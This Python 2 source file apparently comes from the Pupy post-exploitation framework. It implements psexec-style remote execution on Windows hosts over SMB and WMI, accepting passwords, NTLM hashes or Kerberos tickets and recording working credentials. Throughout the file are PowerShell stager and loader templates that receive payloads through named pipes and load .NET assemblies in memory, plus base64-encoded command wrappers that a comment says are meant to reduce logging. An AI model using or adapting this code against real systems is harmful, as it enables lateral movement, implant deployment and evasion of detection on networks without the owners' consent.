#!/usr/bin/env python2

import time
import traceback
import random
import os
import string
import socket

try:
    import idna
    assert idna
except ImportError:
    pass

import encodings

from base64 import b64encode
from hashlib import md5
from threading import Thread
from contextlib import contextmanager

from impacket.dcerpc.v5 import transport, scmr
from impacket.dcerpc.v5.dcomrt import DCOMConnection
from impacket.dcerpc.v5.dcom import wmi
from impacket.dcerpc.v5.dtypes import NULL
from impacket.dcerpc.v5.rpcrt import \
     RPC_C_AUTHN_LEVEL_PKT_PRIVACY, RPC_C_AUTHN_LEVEL_PKT_INTEGRITY
from impacket.system_errors import \
     ERROR_SERVICE_DOES_NOT_EXIST, ERROR_SERVICE_NOT_ACTIVE, \
     ERROR_SERVICE_REQUEST_TIMEOUT
from impacket.smbconnection import SMBConnection, SessionError, SMB_DIALECT
from impacket.smb3structs import (
    FILE_READ_DATA, FILE_WRITE_DATA, FILE_APPEND_DATA
)

from sys import getdefaultencoding

from network.lib.netcreds import add_cred, find_first_cred

from Crypto.Cipher import DES
assert(DES)


SMB_SESSIONS_CACHE = {}
WBEM_SESSIONS_CACHE = {}

USE_CACHE = False

SERVICE_STATUS_STR = {
    scmr.SERVICE_CONTINUE_PENDING: 'CONTINUE_PENDING',
    scmr.SERVICE_PAUSE_PENDING: 'PAUSE_PENDING',
    scmr.SERVICE_PAUSED: 'PAUSED',
    scmr.SERVICE_RUNNING: 'RUNNING',
    scmr.SERVICE_START_PENDING: 'START_PENDING',
    scmr.SERVICE_STOP_PENDING: 'STOP_PENDING',
    scmr.SERVICE_STOPPED: 'STOPPED',
}


class PsExecException(Exception):
    def as_unicode(self, codepage=None):
        error = self.message
        if not isinstance(error, str):
            error = str(error)

        try:
            if codepage:
                error = error.decode(codepage)
            else:
                error = error.decode(getdefaultencoding())

            return error

        except UnicodeError:
            return error.decode('latin1')


# Use Start-Transcript -Path "C:\windows\temp\d.log" -Force; to debug

PIPE_LOADER_TEMPLATE = '''
$p=new-object System.IO.Pipes.NamedPipeServerStream("{pipename}","In",2,"Byte",0,{size},0);
$p.WaitForConnection();
$x=new-object System.IO.BinaryReader($p);
$a=$x.ReadBytes({size});
$x.Close();
[Reflection.Assembly]::Load($a).GetTypes()[0].GetMethods()[0].Invoke($null,@());
'''

PIPE_STAGER_TEMPLATE = '''
$p=new-object System.IO.Pipes.NamedPipeServerStream("{pipename}","In",2,"Byte",0,{size},0);
$p.WaitForConnection();
$pr = New-Object System.Diagnostics.Process -Property @{{
    StartInfo = New-Object System.Diagnostics.ProcessStartInfo -Property @{{
        FileName = '{powershell}';
        UseShellExecute = $false;
        RedirectStandardInput = $true;
        WindowStyle = 1;
    }};
}};
$pr.Start();
$p.CopyTo($pr.StandardInput.BaseStream);
$pr.StandardInput.Close();
'''

PIPE_STDOUT_TEMPLATE = '''
$p=new-object System.IO.Pipes.NamedPipeServerStream("{pipename}","Out",2,"Byte",0,0,{size});
$p.WaitForConnection();
$x=new-object System.IO.BinaryWriter($p);
$StartInfo = New-Object System.Diagnostics.ProcessStartInfo -Property @{{
    FileName = '{arg0}';
    Arguments = '{argv}';
    UseShellExecute = $false;
    RedirectStandardInput = $true;
    RedirectStandardOutput = $true;
    RedirectStandardError = $true;
}};

$Process = New-Object System.Diagnostics.Process;
$Process.StartInfo = $StartInfo;

$enc = [system.Text.Encoding]::UTF8;

$OutEvent = Register-ObjectEvent -Action {{
    $d=$Event.SourceEventArgs.Data;
    if (![string]::IsNullOrEmpty($d)) {{
        $d.Split([Environment]::NewLine) | Foreach {{
            $x.Write($enc.GetBytes($_));
            $x.Write([Char](10));
        }};
        $x.Flush();
    }}
}} -InputObject $Process -EventName OutputDataReceived;

$ErrEvent = Register-ObjectEvent -Action {{
    $d=$Event.SourceEventArgs.Data;
    if (![string]::IsNullOrEmpty($d)) {{
        $d.Split([Environment]::NewLine) | Foreach {{
            $x.Write($enc.GetBytes($_));
            $x.Write([Char](10));
        }};
        $x.Flush();
    }}
}} -InputObject $Process -EventName ErrorDataReceived;

$Process.Start();

$Process.StandardInput.Close();
$Process.BeginOutputReadLine();
$Process.BeginErrorReadLine();

do
{{
    Start-Sleep -Seconds 1;
}}
while (!$Process.HasExited);

$OutEvent.Name, $ErrEvent.Name |
    ForEach-Object {{Unregister-Event -SourceIdentifier $_}};

$x.Close();
'''

POWERSHELL_CMD_TEMPLATE_STD = '{powershell} -version 2 -noninteractive -EncodedCommand "{cmd}"'
# Avoid logging (a bit)
POWERSHELL_CMD_TEMPLATE_CMD = 'cmd.exe /Q /D /S /c "echo:iex([System.Text.Encoding]::ASCII.GetString(' \
    '[Convert]::FromBase64String("{cmd}"))) | {powershell}"'

POWERSHELL_PATH = r'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe'

SERVICE_NAME   = ''.join(random.sample(string.ascii_letters, 10))

if 'idna' not in encodings._cache or not encodings._cache['idna']:
    if 'idna' in encodings._cache:
        del encodings._cache['idna']

    try:
        import encodings.idna
    except ImportError:
        message = 'IDNA module was not loaded. Reload modules with:' + (
            '\n'.join([
                'load_package -f {}'.format(module) for module in (
                    'encodings.idna', 'pupyutils.psexec'
                )]))
        raise RuntimeError(message)

    encodings._cache['idna'] = encodings.idna.getregentry()


def generate_stager_cmd(size=1024):
    pipename = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in xrange(10))
    encoded = b64encode(PIPE_STAGER_TEMPLATE.format(
        pipename=pipename, size=size, powershell=POWERSHELL_PATH))
    cmd = POWERSHELL_CMD_TEMPLATE_CMD.format(powershell=POWERSHELL_PATH, cmd=encoded)
    return cmd, pipename


def generate_loader_payload(size):
    pipename = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in xrange(10))
    payload = PIPE_LOADER_TEMPLATE.format(pipename=pipename, size=size)
    return payload, pipename


def generate_stdo_payload(arg0, argv):
    argv = ' '.join(argv)
    pipename = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in xrange(10))
    payload = PIPE_STDOUT_TEMPLATE.format(
        pipename=pipename, size=1024, arg0=arg0, argv=argv)
    return payload, pipename, arg0, argv


class ConnectionInfo(object):
    __slots__ = (
        'host', 'port', 'user', 'password', 'domain',
        'nt', 'lm',
        'aes', 'TGT', 'TGS', 'KDC', 'valid', 'timeout',
        '_smb_conn', '_wbem_conn', '_dcom_conn', '_use_cache', '_cached'
    )

    def __init__(self, host, port=445, user='', domain='', password='', ntlm='',
                 aes='', tgt='', tgs='', kdc='', timeout=10, use_cache=None):

        self._smb_conn = None
        self._wbem_conn = None
        self._dcom_conn = None
        self._cached = False

        if use_cache is None:
            use_cache = USE_CACHE

        self._use_cache = use_cache

        if type(host) == unicode:
            host = host.encode('utf-8')

        if type(user) == unicode:
            user = user.encode('utf-8')

        if type(password) == unicode:
            password = password.encode('utf-8')

        if type(domain) == unicode:
            domain = domain.encode('utf-8')

        creds = find_first_cred(
            schema='smb', address=host, port=port,
            domain=domain, username=user
        )

        if creds:
            user = user or creds.username
            domain = domain or creds.domain
            password = password or creds.password
            ntlm = ntlm or creds.ntlm
            aes = aes or creds.aes
            tgt = tgt or creds.tgt
            tgs = tgt or creds.tgs
            kdc = kdc or creds.kdc

        self.host = host
        self.port = int(port)
        self.user = user
        self.password = password
        self.domain = domain
        self.lm, self.nt = '', ''
        self.valid = None
        self.timeout = int(timeout)
        self.aes = aes
        self.TGT = tgt
        self.TGS = tgs
        self.KDC = kdc

        if ntlm:
            if ':' in ntlm:
                self.lm, self.nt = ntlm.strip().split(':')
            else:
                self.lm = '00'*16
                self.nt = ntlm

    def __str__(self):
        conninfo = 'host={}:{} user={}'.format(
            self.host, self.port,
            self.domain + '\\' + self.user if self.domain else self.user
        )

        if self.password:
            conninfo += ' '+self.password

        if self.nt and self.lm:
            conninfo += ' ntlm={}:{}'.format(self.lm, self.nt)

        return conninfo

    @property
    def cached(self):
        return self._cached

    @property
    def kerberos(self):
        return bool(self.aes)

    @property
    def ntlm(self):
        return '{}:{}'.format(self.lm, self.nt)

    @property
    def credentials(self):
        return [
            self.user,
            self.password,
            self.domain,
            self.lm, self.nt,
            self.aes, self.TGT, self.TGS
        ]

    def close(self):
        if self._cached:
            # Leak connections if cache is used
            return

        if self._smb_conn:
            try:
                self._smb_conn.close()
            except Exception:
                pass

            self._smb_conn = None

        if self._wbem_conn:
            try:
                self._wbem_conn.RemRelease()
            except Exception:
                pass

            self._wbem_conn = None

        if self._dcom_conn:
            try:
                self._dcom_conn.disconnect()
            except Exception:
                pass

            self._dcom_conn = None

    def __enter__(self):
        pass

    def __exit__(self, *args):
        self.close()

    def _cache_key_entry(self):
        return (
          self.host, self.user, self.password,
          self.domain, self.lm, self.nt, self.aes,
          self.kerberos
        )

    def create_wbem(self, namespace='//./root/cimv2', rpc_auth_level=None):
        if self._wbem_conn:
            return self._wbem_conn

        key = None
        if self._use_cache:
            key = self._cache_key_entry()
            if key in WBEM_SESSIONS_CACHE:
                self._dcom_conn, self._wbem_conn = WBEM_SESSIONS_CACHE[key]
                self._cached = True
                return self._wbem_conn

        dcom = DCOMConnection(
            self.host, self.user, self.password, self.domain,
            self.lm, self.nt, self.aes, oxidResolver=True,
            doKerberos=self.kerberos
        )

        try:
            iInterface = dcom.CoCreateInstanceEx(
                wmi.CLSID_WbemLevel1Login, wmi.IID_IWbemLevel1Login
            )

            iWbemLevel1Login = wmi.IWbemLevel1Login(iInterface)

            iWbemServices = iWbemLevel1Login.NTLMLogin(namespace, NULL, NULL)


            if rpc_auth_level == 'privacy':
                iWbemServices.get_dce_rpc().set_auth_level(
                    RPC_C_AUTHN_LEVEL_PKT_PRIVACY)

            elif rpc_auth_level == 'integrity':
                iWbemServices.get_dce_rpc().set_auth_level(
                    RPC_C_AUTHN_LEVEL_PKT_INTEGRITY)

        except:
            dcom.disconnect()
            raise

        self._dcom_conn = dcom
        self._wbem_conn = iWbemServices

        if key is not None:
            WBEM_SESSIONS_CACHE[key] = self._dcom_conn, self._wbem_conn
            self._cached = True

        return self._wbem_conn

    def create_pipe_dce_rpc(self, pipe, dialect=None):
        rpc = None

        rpc_transport = transport.DCERPCTransportFactory(
            r'ncacn_np:{}[{}]'.format(self.host, pipe))
        rpc_transport.set_dport(self.port)

        if dialect:
            rpc_transport.preferred_dialect(dialect)

        rpc_transport.set_credentials(
            self.user, self.password, self.domain,
            self.lm, self.nt, self.aes,
            self.TGT, self.TGS
        )

        if self._smb_conn:
            rpc_transport.set_smb_connection(self._smb_conn)
            rpc = rpc_transport.get_dce_rpc()
        else:
            key = None

            rpc = rpc_transport.get_dce_rpc()
            rpc.connect()

            if key and key in SMB_SESSIONS_CACHE:
                self._smb_conn = SMB_SESSIONS_CACHE[key]
                rpc_transport.set_smb_connection(self._smb_conn)
                self._cached = True
                return rpc_transport.get_dce_rpc()

            self._smb_conn = rpc_transport.get_smb_connection()

            if key is not None:
                SMB_SESSIONS_CACHE[key] = self._smb_conn
                self._cached = True

        return rpc

    def create_smb_connection(self, force=False):
        if self._smb_conn and not force:
            return self._smb_conn

        key = None

        if self._use_cache and not force:
            key = self._cache_key_entry()
            if key in SMB_SESSIONS_CACHE:
                self._smb_conn = SMB_SESSIONS_CACHE[key]
                self._cached = True
                return self._smb_conn

        try:
            smb = SMBConnection(
                self.host, self.host, None, self.port, timeout=self.timeout
            )

            if self.kerberos:
                smb.kerberos_login(
                    self.user, self.password,
                    self.domain, self.lm, self.nt,
                    self.aes, self.KDC, self.TGT, self.TGS)
            else:
                smb.login(self.user, self.password, self.domain, self.lm, self.nt)

            self.valid = True

            add_cred(
                self.user, self.password, self.domain, 'smb',
                self.host, None, self.port,
                ntlm=self.ntlm, aes=self.aes,
                tgt=self.TGT, tgs=self.TGS, kdc=self.KDC
            )

            if not force:
                self._smb_conn = smb

            if key is not None and not force:
                SMB_SESSIONS_CACHE[key] = self._smb_conn

            return smb

        except SessionError, e:
            raise PsExecException(e.getErrorString()[0])

        except (OSError, socket.error), e:
            raise PsExecException(e)

        except Exception, e:
            error = '{}: {}\n{}'.format(type(e).__name__, e, traceback.format_exc())
            raise PsExecException(error)


class SMBPipeObject(object):
    __slots__ = ('conn', 'tid', 'fid')

    def __init__(self, conn, tid, fid):
        self.conn = conn
        self.tid = tid
        self.fid = fid

    def write(self, data, wait=True):
        try:
            self.conn.writeNamedPipe(self.tid, self.fid, data, wait)
        except SessionError as e:
            if e.getErrorCode() == 0xc000014b:
                return None
            else:
                raise

    def read(self, amount=None):
        try:
            data = self.conn.readNamedPipe(self.tid, self.fid, amount)
        except SessionError as e:
            if e.getErrorCode() == 0xc000014b:
                return None
            else:
                raise

        return data


class FileTransfer(object):
    __slots__ = (
        '_exception', '_conn', '_cached'
    )

    def __init__(self, conn, cached=False):
        self._exception = None
        self._conn = conn
        self._cached = cached

    @property
    def error(self):
        if self.ok:
            return None

        te = type(self._exception)
        if te in (UnicodeEncodeError, UnicodeDecodeError):
            return 'Could not convert name to unicode. Use -c option to specify encoding'
        elif te == SessionError:
            error = self._exception.getErrorString()[1]
            if type(error) != unicode:
                error = error.decode(getdefaultencoding())
            return error
        else:
            return te.__name__ +": " + str(self._exception)

    @property
    def ok(self):
        return self._exception is None

    @property
    def info(self):
        return self._conn.getServerOS()

    def shares(self):
        self._exception = None

        try:
            return [
                x['shi1_netname'][:-1] for x in self._conn.listShares()
            ]

        except Exception, e:
            self._exception = e
            return []

    @contextmanager
    def open_pipe(self, path, mode, timeout=600, shareMode=0):
        tid = self._conn.connectTree('IPC$')
        pipeReady = False

        for _ in xrange(timeout):
            try:
                self._conn.waitNamedPipe(tid, '\\' + path)
                pipeReady = True
                break

            except SessionError as e:
                if e.getErrorCode() == 0xc0000034:
                    time.sleep(1)
                else:
                    raise

        if not pipeReady:
            # Last try, will raise
            self._conn.waitNamedPipe(tid, '\\' + path)

        fid = self._conn.openFile(
            tid, path, mode, shareMode=shareMode)

        try:
            yield SMBPipeObject(self._conn, tid, fid)
        finally:
            self._conn.closeFile(tid, fid)

    def ls(self, share, path):
        self._exception = None

        try:
            listing = []
            for f in self._conn.listPath(share, path):
                if f.get_longname() in ('.', '..'):
                    continue

                listing.append((
                    f.get_longname(), f.is_directory() > 0,
                    f.get_filesize(), time.ctime(float(f.get_mtime_epoch()))
                ))
            return listing

        except Exception, e:
            self._exception = e
            return []

    def rm(self, share, path):
        self._exception = None

        try:
            self._conn.deleteFile(share, path)
        except Exception, e:
            self._exception = e

    def mkdir(self, share, path):
        self._exception = None

        try:
            self._conn.createDirectory(share, path)
        except Exception, e:
            self._exception = e

    def rmdir(self, share, path):
        self._exception = None

        try:
            self._conn.deleteDirectory(share, path)
        except Exception, e:
            self._exception = e

    def get(self, share, remote, local):
        self._exception = None

        if not self.ok:
            raise ValueError('Connection was not established')

        try:
            if type(local) in (str, unicode):
                local = os.path.expandvars(local)
                local = os.path.expanduser(local)

                with open(local, 'w+b') as destination:
                    self._conn.getFile(
                        share,
                        remote,
                        destination.write
                    )
            else:
                self._conn.getFile(share, remote, local)

        except Exception, e:
            self._exception = e

    def put(self, local, share, remote):
        self._exception = None

        if not self.ok:
            raise ValueError('Connection was not established')

        try:
            if type(local) in (str, unicode):
                local = os.path.expandvars(local)
                local = os.path.expanduser(local)

                if not os.path.exists(local):
                    raise ValueError('Local file ({}) does not exists'.format(local))

                with open(local, 'rb') as source:
                    self._conn.putFile(
                        share,
                        remote,
                        source.read
                    )
            else:
                self._conn.putFile(share, remote, local)

        except Exception, e:
            self._exception = e

    def push_to_pipe(self, pipe, data, timeout=90):
        with self.open_pipe(pipe, FILE_WRITE_DATA | FILE_APPEND_DATA, timeout) as pipe:
            # Write by small chunks (1.4 KB)
            # Slow, but should work with crappy networks
            for offset in xrange(0, len(data), 1400):
                pipe.write(data[offset:offset+1400])

    def close(self):
        if self._conn and not self._cached:
            self._conn.close()


class ShellServiceAlreadyExists(Exception):
    pass


class ShellServiceIsNotExists(Exception):
    pass


class ShellService(object):
    __slots__ = (
        '_scHandle', '_serviceHandle', '_scmr', '_name', '_command'
    )

    def __init__(self, rpc, name=SERVICE_NAME):
        if type(name) == unicode:
            name = name.encode('latin1', errors='ignore')

        self._name = name + '\x00'

        self._scmr = rpc
        self._scmr.bind(scmr.MSRPC_UUID_SCMR)

        resp = scmr.hROpenSCManagerW(self._scmr)
        self._scHandle = resp['lpScHandle']

        self._serviceHandle = None
        self._command = None

        try:
            resp = scmr.hROpenServiceW(self._scmr, self._scHandle, self._name)
            self._serviceHandle = resp['lpServiceHandle']

        except Exception, e:
            if hasattr(e, 'error_code') and e.error_code == ERROR_SERVICE_DOES_NOT_EXIST:
                pass
            else:
                raise

    def create(self, command):
        if self._serviceHandle:
            raise ShellServiceAlreadyExists()

        if not command.endswith('\x00'):
            command += '\x00'

        resp = scmr.hRCreateServiceW(
            self._scmr,
            self._scHandle,
            self._name,
            self._name,
            lpBinaryPathName=command
        )

        self._command = command
        self._serviceHandle = resp['lpServiceHandle']
        return self._serviceHandle

    def start(self):
        if not self._serviceHandle:
            raise ShellServiceIsNotExists()

        try:
            scmr.hRStartServiceW(self._scmr, self._serviceHandle)
        except Exception, e:
            if hasattr(e, 'error_code') and e.error_code == ERROR_SERVICE_REQUEST_TIMEOUT:
                return False

            raise

    def status(self):
        if not self._serviceHandle:
            raise ShellServiceIsNotExists()

        resp = scmr.hRQueryServiceStatus(self._scmr, self._serviceHandle)
        return resp['lpServiceStatus']['dwCurrentState']

    @property
    def command(self):
        return self._command

    @property
    def handle(self):
        return self._serviceHandle

    @property
    def name(self):
        return self._name

    @property
    def exists(self):
        return self._serviceHandle is not None

    @property
    def active(self):
        return self.status() == scmr.SERVICE_RUNNING

    @property
    def stopped(self):
        return self.status() == scmr.SERVICE_STOPPED

    def destroy(self):
        if not self._serviceHandle:
            raise ShellServiceIsNotExists()

        try:
            scmr.hRControlService(self._scmr, self._serviceHandle, scmr.SERVICE_CONTROL_STOP)
        except Exception, e:

            try:
                scmr.hRDeleteService(self._scmr, self._serviceHandle)
            finally:
                scmr.hRCloseServiceHandle(self._scmr, self._serviceHandle)
                self._serviceHandle = None

            if hasattr(e, 'error_code') and e.error_code == ERROR_SERVICE_NOT_ACTIVE:
                pass
            else:
                raise


def create_filetransfer(*args, **kwargs):
    try:
        info = ConnectionInfo(*args, **kwargs)
        smbc = info.create_smb_connection()
        return FileTransfer(smbc, info.cached), None

    except PsExecException as e:
        return None, e.as_unicode(kwargs.get('codepage', None)) + ' CREDS:{}'.format(info.credentials)


def sc(conninfo, command, output=True, on_data=None, on_exec=None):
    rpc = conninfo.create_pipe_dce_rpc(r'\pipe\svcctl')
    ft = None

    payload = None
    stdout = None
    stager_pipe = None

    if output:
        argv0 = command
        argv = []

        if ' ' in command:
            parts = command.split(' ', 1)
            argv0, argv = parts[0], parts[1:]

        payload, stdout, arg0, argv = generate_stdo_payload(argv0, argv)
        command, stager_pipe = generate_stager_cmd(len(payload))

        if on_data:
            on_data(False, 'Wrapped: arg0={} argv={}'.format(arg0, argv))

    if on_data:
        on_data(False, 'Connected to svcctl')

    starter = None
    service = ShellService(rpc)

    if on_data:
        on_data(False, 'Connected to SCManager')

    if service.exists:
        if on_data:
            on_data(False, 'Delete existing service')

        service.destroy()

    if command.startswith(('cmd ', 'cmd.exe')):
        # zOMG Need to have double encoded shit
        # In other cases some God-Knows-What happend with pipes/stdo etc
        command = 'cmd.exe /Q /D /S /c "' + command.replace(
            '"', '^"'
        ).replace(
            '|', '^|'
        ) + '"'

    if not service.create(command):
        raise PsExecException('Could not create service')

    try:
        if on_data:
            on_data(False, 'Service {} created (command={} len={})'.format(
                service.name, service.command, len(service.command)))

        timeout = None

        if conninfo.timeout:
            timeout = time.time() + conninfo.timeout

        output_data = []

        if output:
            # Service start will block, so we'll do that in separate thread
            starter = Thread(target=service.start)
            starter.daemon = True
            starter.start()

            if on_data:
                on_data(False, 'Service {} (hopefully) started'.format(service.name))

            ft = FileTransfer(
                conninfo.create_smb_connection(
                    # We need new connection, because previous one is blocked
                    force=True
                ), False
            )

            if on_data:
                on_data(False, 'New connection to {}'.format(ft.info))

            try:
                if on_data:
                    on_data(False, 'Connecting to stager (pipe={})'.format(stager_pipe))

                with ft.open_pipe(stager_pipe, FILE_WRITE_DATA | FILE_APPEND_DATA, conninfo.timeout) as pipe:
                    if on_data:
                        on_data(False, 'Connected to the stager pipe')

                    pipe.write(payload)

                if on_exec:
                    on_exec(ft)

                if on_data:
                    on_data(False, 'Connecting to stdout (pipe={})'.format(stdout))

                with ft.open_pipe(stdout, FILE_READ_DATA, conninfo.timeout) as pipe:
                    if on_data:
                        on_data(False, 'Connected to stdout')

                    while True:
                        chunk = pipe.read(1024)
                        if not chunk:
                            break

                        if '\r\n' in chunk:
                            chunk = chunk.replace('\r\n', '\n')

                        if on_data:
                            on_data(True, chunk)
                        else:
                            output_data.append(chunk)

                        if timeout is not None and time.time() >= timeout:
                            break
            finally:
                ft.close()

        else:
            if on_exec:
                starter = Thread(target=service.start)
                starter.daemon = True
                starter.start()

                ft = FileTransfer(
                    conninfo.create_smb_connection(
                        # We need new connection, because previous one is blocked
                        force=True
                    ), False
                )

                try:
                    on_exec(ft)
                finally:
                    ft.close()
            else:
                service.start()

    finally:
        if starter is not None:
            if on_data:
                on_data(False, 'Waiting start completion {}'.format(service.name))

            starter.join()

        if on_data:
            on_data(False, 'Destroying service {}'.format(service.name))

        try:
            service.destroy()
        except Exception as e:
            if on_data:
                on_data(False, 'SC destroy failed: {}'.format(e))

            pass

    if on_data:
        on_data(False, 'SC complete')

    return ''.join(output_data), ft


def wmiexec(conninfo, command, output=True, on_data=None, on_exec=None):
    timeout = None

    if conninfo.timeout:
        timeout = time.time() + conninfo.timeout

    iWbemServices = conninfo.create_wbem()

    if on_data:
        on_data(False, 'Connected to WMI')

    win32Process, _ = iWbemServices.GetObject('Win32_Process')

    output_data = []
    ft = None

    if output:
        parts = command.split(' ', 1)
        argv0, argv = parts[0], parts[1:]

        payload, stdout, arg0, argv = generate_stdo_payload(argv0, argv)
        if on_data:
            on_data(False, 'Wrapped: arg0={} argv={}'.format(arg0, argv))

        stager, stager_pipe = generate_stager_cmd(len(payload))

        ft = FileTransfer(
            conninfo.create_smb_connection(), conninfo.cached
        )

        iResultClassObject = win32Process.Create(stager, 'C:\\', None)
        result = iResultClassObject.ReturnValue
        if result:
            raise PsExecException('Win32_Process.Create failed: {}'.format(result))

        if on_data:
            on_data(False, '{} -> {}'.format(stager, iResultClassObject.ProcessId))

        if on_data:
            on_data(False, 'Connecting to the stager pipe (pipe={})'.format(stager_pipe))

        with ft.open_pipe(stager_pipe, FILE_WRITE_DATA | FILE_APPEND_DATA, conninfo.timeout) as pipe:
            if on_data:
                on_data(False, 'Connected to the stager pipe')

            pipe.write(payload)

        if on_exec:
            ft = FileTransfer(
                conninfo.create_smb_connection(), conninfo.cached
            )

            on_exec(ft)

        if on_data:
            on_data(False, 'Connecting to stdout (pipe={})'.format(stdout))

        with ft.open_pipe(stdout, FILE_READ_DATA, conninfo.timeout) as pipe:
            if on_data:
                on_data(False, 'Connected to stdout')

            while True:
                chunk = pipe.read(1024)
                if not chunk:
                    break

                if on_data:
                    on_data(True, chunk)
                else:
                    output_data.append(chunk)

                if timeout is not None and time.time() >= timeout:
                    break
    else:
        iResultClassObject = win32Process.Create(command, 'C:\\', None)

        if iResultClassObject.ReturnValue:
            raise PsExecException(
            'Win32_Process.Create failed: {}'.format(iResultClassObject.ReturnValue))
        elif on_data:
            if on_data:
                on_data(False, '{} -> {}'.format(command, iResultClassObject.ProcessId))

        if on_exec:
            ft = FileTransfer(
                conninfo.create_smb_connection(), conninfo.cached
            )

            on_exec(ft)

    return ''.join(output_data), ft


def wql(
    host, port, user, domain, password, ntlm,
        query, timeout=30, namespace='//./root/cimv2', rpc_auth_level=None):

    conninfo = ConnectionInfo(
        host, port, user, domain, password, ntlm, timeout=timeout
    )

    with conninfo:
        iWbemServices = conninfo.create_wbem(namespace, rpc_auth_level)
        iEnumWbemClassObject = iWbemServices.ExecQuery(query.strip())

        first = True
        columns = None

        try:
            result = []
            while True:
                try:
                    pEnum = iEnumWbemClassObject.Next(0xffffffff,1)[0]
                    header = pEnum.getProperties()
                    if first:
                        columns = tuple(x for x in header)
                        first = False

                    item = [None]*len(columns)

                    for idx, key in enumerate(columns):
                        if type(header[key]['value']) is list:
                            item[idx] = tuple([
                                value for value in header[key]['value']
                            ])
                        else:
                            item[idx] = header[key]['value']

                    result.append(item)

                except Exception as e:
                    if str(e).find('S_FALSE') < 0:
                        raise
                    else:
                        break

            return columns, tuple(result)

        finally:
            iEnumWbemClassObject.RemRelease()


def check(host, port, user, domain, password, ntlm, timeout=30):
    conninfo = ConnectionInfo(
        host, port, user, domain, password, ntlm, timeout=timeout
    )

    try:
        with conninfo:
            conninfo.create_smb_connection()
    except:
        return False

    return True


def _psexec(
    conninfo, command, execm='smbexec',
        codepage=None, output=True,
        on_exec=None, on_data=None, on_complete=None, verbose=False):

    if on_data and verbose:
        on_data('PSExec thread started')

    def _on_data(is_output, data):
        if data:
            if codepage:
                data = data.decode(codepage)

            if is_output or verbose:
                on_data(data)

    try:
        with conninfo:
            if execm == 'smbexec':
                sc(
                    conninfo, command, output, _on_data if on_data else None,
                    on_exec
                )

            elif execm == 'wmi':
                wmiexec(
                    conninfo, command, output, _on_data if on_data else None,
                    on_exec
                )

            else:
                raise ValueError('Unknown execution method, knowns are smbexec/wmi')

    except PsExecException as e:
        if on_complete:
            on_complete(e.as_unicode(codepage))

    except SessionError as e:
        if on_complete:
            on_complete('{}:{} {}'.format(conninfo.host, conninfo.port, e))

    except Exception as e:
        if on_complete:
            on_complete(
                '{}:{} {}: {}\n{}'.format(
                    conninfo.host,
                    conninfo.port,
                    type(e).__name__, e,
                    traceback.format_exc()))

    finally:
        if on_data and verbose:
            on_data('PSExec thread completed')

        if on_complete:
            on_complete(None)


def psexec(
        host, port,
        user, domain,
        password, ntlm,
        command, execm='smbexec',
        codepage=None, timeout=30, output=True, on_exec=None,
        on_data=None, on_complete=None, verbose=False):

    conninfo = ConnectionInfo(
        host, port, user, domain, password, ntlm, timeout=timeout
    )

    worker = Thread(
        target=_psexec,
        args=(
            conninfo,
            command, execm, codepage, output,
            on_exec, on_data, on_complete, verbose
        )
    )
    worker.daemon = True
    worker.start()


def get_cache():
    if USE_CACHE is not True:
        raise ValueError('Cache disabled')

    keys = set()
    keys.update(tuple(x) for x in SMB_SESSIONS_CACHE)
    keys.update(tuple(x) for x in WBEM_SESSIONS_CACHE)

    return tuple(keys)


def clear_session_caches():
    for session in SMB_SESSIONS_CACHE.values():
        try:
            session.close()
        except Exception:
            pass

    for dcom, wbem in WBEM_SESSIONS_CACHE.values():
        try:
            wbem.RemRelease()
        except Exception:
            pass

        try:
            dcom.disconnect()
        except Exception:
            pass

    SMB_SESSIONS_CACHE.clear()
    WBEM_SESSIONS_CACHE.clear()


def set_use_cache(use_cache):
    global USE_CACHE
    USE_CACHE = use_cache

    if use_cache is False:
        clear_session_caches()


def pupy_smb_exec(
    host, port,
    user, domain,
    password, ntlm,
    payload,
    execm='smbexec',
    timeout=90, log_cb=None):

    size = len(payload)

    loader_payload, loader_pipename = generate_loader_payload(size)
    stager_cmd, stager_pipename = generate_stager_cmd(len(loader_payload))

    def _psexec_log(data):
        if log_cb:
            log_cb(None, data)

    def _loader():
        if log_cb:
            log_cb(None, 'Thread started (pipe={}, payload={}, md5={})'.format(
                loader_pipename, size, md5(payload).hexdigest()))

        def _on_complete(error):
            if log_cb:
                if error:
                    log_cb(False, 'PSExec failed: {}'.format(error))
                else:
                    log_cb(True, 'PSExec: process exited')

        def _push_payload(ft):
            if log_cb:
                log_cb(None, 'Connected to {}:{} (user={}, os={})'.format(
                    host, port, ((domain + '\\') if domain else '') + user,
                    ft.info))

            try:
                ft.push_to_pipe(stager_pipename, loader_payload, timeout=timeout)
                if log_cb:
                    log_cb(None, 'Stager flushed')

            except Exception, e:
                if log_cb:
                    import traceback
                    log_cb(None, '{}: {}'.format(
                        e, traceback.format_exc()))

                return

            try:
                ft.push_to_pipe(loader_pipename, payload, timeout=timeout)
                if log_cb:
                    log_cb(None, 'Payload flushed')

            except Exception, e:
                if log_cb:
                    import traceback
                    log_cb(None, '{}: {}'.format(
                        e, traceback.format_exc()))

        try:
            conninfo = ConnectionInfo(
                host, port, user, domain, password, ntlm, timeout=timeout
            )

            _psexec(
                conninfo,
                stager_cmd, execm=execm,
                output=False,
                on_exec=_push_payload,
                on_data=_psexec_log,
                on_complete=_on_complete,
                verbose=True
            )

        except Exception, e:
            if log_cb:
                import traceback
                log_cb(
                    False, 'Communication failed: {} {} {} {})'.format(
                        e, type(e), dir(e), traceback.format_exc()))

    worker = Thread(
        target=_loader,
        name='PowerLoader [smb] (stager pipe={}, loader pipe={}, timeout={})'.format(
            stager_pipename, loader_pipename, timeout)
    )
    worker.daemon = True
    worker.start()

    return stager_cmd, loader_pipename
